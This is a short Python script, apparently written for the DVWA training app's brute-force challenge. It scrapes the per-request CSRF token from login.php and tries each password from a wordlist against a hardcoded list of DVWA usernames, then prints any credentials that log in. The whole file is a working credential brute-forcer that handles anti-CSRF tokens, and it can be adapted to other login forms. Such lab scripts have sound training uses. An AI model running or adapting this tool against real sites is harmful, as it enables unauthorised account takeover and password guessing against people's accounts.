#!/usr/bin/env python3
#A bruteforce script for DVWA bruteforce challange
import requests
import re
from cmd import Cmd
import sys

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <wordlist>\n")
    sys.exit()

class Terminal(Cmd):
    intro = "DVWA Bruteforce\n"
    prompt = "url [http://ip_address/] >> "
    def default(self, line):
        bruteforcer(line)

def bruteforcer(url):
    global wordlist
    session = requests.session()
    #open a file containing a list of passwords
    with open(sys.argv[1], "r") as file:
        content = file.readlines()
        passwords = [x.strip() for x in content]
    #Let's create a list with valid users
    usernames = ['admin','gordonb', '1337', 'pablo', 'smithy']

    for username in usernames:
        for password in passwords:
            login = session.get(f"{url}/login.php")
            user_token = re.search("'user_token' value='(.*?)'", login.text).group(1)
            #print (f"user-token: {user_token}\n")
            post_data = {
                    "username" : username,
                    "password" : password,
                    "Login" : "Login",
                    "user_token" : user_token
                    }
            validation = session.post(f"{url}/login.php", data=post_data)
            
            if "Login failed" in validation.text:
                pass
            elif "CSRF token is incorrect" in validation.text:
                print ("[-] CSRF token is incorrect")
                sys.exit()
            else:
                print (f"[+] Login success!!!!\n[+] Your credentials below\n[+] {username}:{password}\n")
                break
    print ("[-] Goodbye")

if __name__ == ("__main__"):
    terminal = Terminal()
    terminal.cmdloop()